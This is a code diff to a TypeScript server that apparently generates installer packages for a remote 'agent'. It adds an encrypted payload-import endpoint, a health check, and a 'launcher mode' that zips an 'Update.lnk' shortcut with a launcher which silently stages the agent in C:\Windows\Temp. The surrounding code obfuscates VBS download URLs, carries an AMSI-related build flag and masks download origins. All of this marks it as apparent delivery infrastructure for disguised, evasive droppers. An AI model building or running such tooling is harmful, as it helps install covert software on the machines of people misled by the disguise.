@@ -6,12 +6,15 @@ import { FastifyInstance, FastifyRequest, FastifyReply } from "fastify";
 import * as crypto from "crypto";
 import * as fs from "fs";
 import * as path from "path";
+import { spawnSync } from "child_process";
 import { env } from "./env";
 import * as storage from "./storage";
 import * as builder from "./builder";
 import * as exeBuilder from "./exe-builder";
 import { runZipBuild, AmiMode } from "./zip-builder";
 import { createZip } from "./zip-archive";
+import * as payloadCache from "./payload-cache";
+import { runLauncherBuild } from "./launcher-build";
 import {
   buildEnrollmentCommand,
   toPowerShellInstallCommand,
@@ -78,6 +81,42 @@ function obfuscateVbsUrl(url: string): string {
   parts.push(url.slice(prev));
 
   return parts.map(p => `"${p}"`).join(' & ');
+}
+
+/**
+ * POST /payload — one-time import of the agent exe into the launcher-mode
+ * payload cache (bearer-authed, raw application/octet-stream body).
+ *
+ * The artifact is stored pre-encrypted under the master key; the plaintext is
+ * never written to disk and launcher builds never fetch it at request time.
+ */
+async function postPayload(request: FastifyRequest, reply: FastifyReply) {
+  const authHeader = request.headers.authorization;
+  if (!authHeader || !authHeader.startsWith("Bearer ")) {
+    return reply.status(401).send({ error: "Unauthorized" });
+  }
+  const token = authHeader.slice(7);
+  if (!timingSafeCompare(token, env.GENERATOR_SECRET)) {
+    return reply.status(401).send({ error: "Unauthorized" });
+  }
+  const body = request.body;
+  if (!(body instanceof Buffer) || body.length === 0) {
+    return reply
+      .status(400)
+      .send({ error: "Expected an application/octet-stream payload body" });
+  }
+  try {
+    const meta = payloadCache.importFromBuffer(body, "upload");
+    return reply.status(200).send({
+      ok: true,
+      sha256: meta.sha256,
+      size: meta.size,
+    });
+  } catch (err) {
+    const message = err instanceof Error ? err.message : String(err);
+    console.error(`Payload import failed: ${message}`);
+    return reply.status(500).send({ error: "Payload import failed" });
+  }
 }
 
 /**
@@ -404,46 +443,90 @@ async function postBuildZip(request: FastifyRequest, reply: FastifyReply) {
 
   // Rebuild server-side (mirror of toPowerShellInstallCommand's shape).
   const fullCommand = toPowerShellInstallCommand(inputs, exeUrl);
-  // What actually gets embedded: just the enrollment step (the .lnk's own
-  // downloader already fetches + silently installs the base agent).
+  // What actually gets embedded in the legacy .lnk: just the enrollment step
+  // (the .lnk's own downloader already fetches + silently installs the base
+  // agent). In launcher mode this is carried INSIDE the encrypted config for
+  // the staged-payload execute+enroll runbook step.
   const enrollmentCommand = buildEnrollmentCommand(inputs);
+
+  // Launcher mode (WP4): `launcherMode: true` switches this job to the
+  // offline carrier path — the zip ships { Update.lnk, Launcher.exe } and the
+  // .lnk runs the GUI launcher directly (relative target, NO command-line
+  // arguments, nothing downloaded at runtime). Absent/false keeps the legacy
+  // Agent.lnk path byte-identical.
+  const launcherMode = body.launcherMode === true;
+  // Optional staging directory for the payload inside the encrypted config
+  // (operator-tunable; C:\Windows\Temp is the default).
+  const rawOutDir =
+    typeof flags.outDir === "string" && flags.outDir.trim() !== ""
+      ? flags.outDir.trim()
+      : "C:\\Windows\\Temp";
 
   // Create the job dir first so the .lnk lands under jobs/{jobId}/.
   const jobId = storage.createJob();
   const lnkPath = storage.lnkOutputPath(jobId);
 
   try {
-    const result = await runZipBuild({
-      scriptPath: path.join(__dirname, "New-AgentShortcut.ps1"),
-      exeUrl,
-      fileName,
-      outputPath: lnkPath,
-      installCommand: enrollmentCommand,
-      authToken,
-      amsi,
-    });
+    if (launcherMode) {
+      // Offline carrier build: warm launcher + envelope stamp + Update.lnk +
+      // 2-entry zip, then the WP6 validation report card. Throws on failure.
+      await runLauncherBuild({
+        jobId,
+        inputs: {
+          apiUrl,
+          clientId,
+          siteId,
+          agentType: agentType as AgentType,
+          authToken,
+          features,
+          enroll: enrollmentCommand,
+          outDir: rawOutDir,
+          debug: false, // silent production (the marker is opt-in via flags)
+        },
+      });
+      if (!fs.existsSync(storage.zipOutputPath(jobId))) {
+        throw new Error("launcher build finished without producing a zip");
+      }
+      console.log(
+        `Launcher-mode ZIP build ok for job ${jobId}; client cmd len=${clientInstallCommand.length}, rebuilt len=${fullCommand.length}`
+      );
+    } else {
+      const result = await runZipBuild({
+        scriptPath: path.join(__dirname, "New-AgentShortcut.ps1"),
+        exeUrl,
+        fileName,
+        outputPath: lnkPath,
+        installCommand: enrollmentCommand,
+        authToken,
+        amsi,
+      });
 
-    if (!result.success) {
-      console.error(`ZIP build failed for job ${jobId}: ${result.output}`);
-      storage.cleanupJob(jobId);
-      return reply
-        .status(500)
-        .send({ error: "ZIP build failed", detail: result.output });
+      if (!result.success) {
+        console.error(`ZIP build failed for job ${jobId}: ${result.output}`);
+        storage.cleanupJob(jobId);
+        return reply
+          .status(500)
+          .send({ error: "ZIP build failed", detail: result.output });
+      }
+
+      if (!fs.existsSync(lnkPath)) {
+        console.error(`ZIP build reported success but no Agent.lnk for ${jobId}`);
+        storage.cleanupJob(jobId);
+        return reply.status(500).send({ error: "Agent.lnk was not produced" });
+      }
+
+      // STAGE 2 (Task D): zip the single Agent.lnk, then drop the temp .lnk and
+      // keep only the zip (until expiry). The .lnk downloads + installs the agent
+      // exe at runtime, so the exe itself never ships inside the zip.
+      const lnkData = fs.readFileSync(lnkPath);
+      const zipBuffer = createZip([{ name: "Agent.lnk", data: lnkData }]);
+      fs.writeFileSync(storage.zipOutputPath(jobId), zipBuffer);
+      storage.removeLnk(jobId);
+
+      console.log(
+        `ZIP build ok for job ${jobId}; client cmd len=${clientInstallCommand.length}, rebuilt len=${fullCommand.length}; zip ${zipBuffer.length} bytes`
+      );
     }
-
-    if (!fs.existsSync(lnkPath)) {
-      console.error(`ZIP build reported success but no Agent.lnk for ${jobId}`);
-      storage.cleanupJob(jobId);
-      return reply.status(500).send({ error: "Agent.lnk was not produced" });
-    }
-
-    // STAGE 2 (Task D): zip the single Agent.lnk, then drop the temp .lnk and
-    // keep only the zip (until expiry). The .lnk downloads + installs the agent
-    // exe at runtime, so the exe itself never ships inside the zip.
-    const lnkData = fs.readFileSync(lnkPath);
-    const zipBuffer = createZip([{ name: "Agent.lnk", data: lnkData }]);
-    fs.writeFileSync(storage.zipOutputPath(jobId), zipBuffer);
-    storage.removeLnk(jobId);
 
     const expiresAt = new Date(Date.now() + expiryHours * 60 * 60 * 1000);
     storage.saveZipExpiry(jobId, expiresAt);
@@ -454,7 +537,7 @@ async function postBuildZip(request: FastifyRequest, reply: FastifyReply) {
     const downloadUrl = `${maskedBase}/d/${jobId}`;
 
     console.log(
-      `ZIP build ok for job ${jobId}; client cmd len=${clientInstallCommand.length}, rebuilt len=${fullCommand.length}; zip ${zipBuffer.length} bytes; expires ${expiresAt.toISOString()}`
+      `Launcher-mode=${launcherMode} ZIP build ok for job ${jobId}; expires ${expiresAt.toISOString()}`
     );
 
     return reply.status(200).send({
@@ -619,9 +702,106 @@ async function getMaskedZipRedirect(
 }
 
 /**
+ * Simple spawn check — returns true when the command exits 0.
+ */
+function toolPresent(bin: string, args: string[]): boolean {
+  try {
+    const r = spawnSync(bin, args, { stdio: "ignore", timeout: 10_000 });
+    return r.status === 0 && r.error === undefined;
+  } catch {
+    return false;
+  }
+}
+
+/**
+ * GET /health (and /healthz) — operator/monitoring status endpoint.
+ *
+ * Untrusted, but intentionally public (no secrets): it reports which host
+ * prerequisites are present, whether an agent payload has been imported, and a
+ * machine-readable `ready` flag so "requisites missing" is never a silent guess
+ * again (Task 3-C). It never leaks the GENERATOR_SECRET, the payload key, or
+ * per-job data.
+ */
+async function getHealth(_request: FastifyRequest, reply: FastifyReply) {
+  const buildScript = path.join(env.MSI_BUILDER_PATH, "build", "build.sh");
+  const mcs = env.MONO_MCS_PATH || "mcs";
+
+  const tools = {
+    node: process.version,
+    pwsh: toolPresent("pwsh", ["-NoProfile", "-NoLogo", "-Command", "\"ok\""]),
+    // mono-mcs is only needed on the default (non-native) launcher path.
+    mcs: env.LAUNCHER_NATIVE ? null : toolPresent(mcs, ["--version"]),
+    // MinGW cross-compiler is only needed on the native launcher path.
+    mingw: env.LAUNCHER_NATIVE ? toolPresent(env.NATIVE_CC, ["--version"]) : null,
+    // wixl (from msitools) is only needed for MSI builds.
+    wixl: toolPresent("wixl", ["--help"]),
+  };
+
+  const msiBuilderOk =
+    fs.existsSync(env.MSI_BUILDER_PATH) && fs.existsSync(buildScript);
+
+  const payload = payloadCache.status();
+
+  const launcherReady =
+    payload.imported &&
+    (env.LAUNCHER_NATIVE ? tools.mingw === true : tools.mcs === true);
+
+  const missing: string[] = [];
+  if (!msiBuilderOk) {
+    missing.push("MSI_BUILDER_PATH (build.sh not found)");
+  }
+  if (!tools.pwsh) {
+    missing.push("pwsh (PowerShell 7) — required for the ZIP installer");
+  }
+  if (env.LAUNCHER_NATIVE) {
+    if (!tools.mingw) {
+      missing.push(`${env.NATIVE_CC} (MinGW cross-compiler) — required for the native launcher`);
+    }
+  } else if (!tools.mcs) {
+    missing.push("mcs (mono-mcs) — set LAUNCHER_NATIVE=1 to use the MinGW/native path instead");
+  }
+  if (!payload.imported) {
+    missing.push("agent payload — import via POST /payload or set PAYLOAD_PATH and restart");
+  }
+  if (!env.REDIRECT_BASE_URL) {
+    missing.push("REDIRECT_BASE_URL (origin masking off — zip links fall back to PUBLIC_URL)");
+  }
+
+  reply.send({
+    ok: launcherReady && tools.pwsh,
+    service: "vantra-msi-generator",
+    launcherMode: env.LAUNCHER_NATIVE ? "native" : "mono",
+    config: {
+      msiBuilderOk,
+      publicUrl: env.PUBLIC_URL,
+      redirectBaseUrl: env.REDIRECT_BASE_URL || null,
+      launcherPoolSize: env.LAUNCHER_POOL_SIZE,
+      payloadMasterKey: env.PAYLOAD_MASTER_KEY ? "env" : "file-or-unset",
+    },
+    tools,
+    payload: payload.imported
+      ? { imported: true, ...payload.meta }
+      : { imported: false },
+    launcherReady,
+    msiReady: msiBuilderOk && tools.wixl,
+    ready: launcherReady && tools.pwsh,
+    missing,
+  });
+}
+
+/**
  * Register routes with the Fastify instance.
  */
 export async function registerRoutes(app: FastifyInstance) {
+  // Raw agent-exe import for the launcher payload cache (one-time). The body
+  // is a plain byte stream (never shell-processed; validated in memory).
+  app.addContentTypeParser(
+    "application/octet-stream",
+    { parseAs: "buffer", bodyLimit: 600 * 1024 * 1024 },
+    (request, body, done) => done(null, body)
+  );
+  app.post("/payload", postPayload);
+
   // /build serves two payload types on the same route, selected by
   // Content-Type:
   //   - multipart/form-data  -> MSI/VBS/EXE packaging (legacy path)
@@ -638,4 +818,6 @@ export async function registerRoutes(app: FastifyInstance) {
   app.get("/downloads/:jobId/installer.exe", getExeDownload);
   app.get("/downloads/:jobId/zip", getZipDownload);
   app.get("/d/:jobId", getMaskedZipRedirect);
+  app.get("/health", getHealth);
+  app.get("/healthz", getHealth);
 }
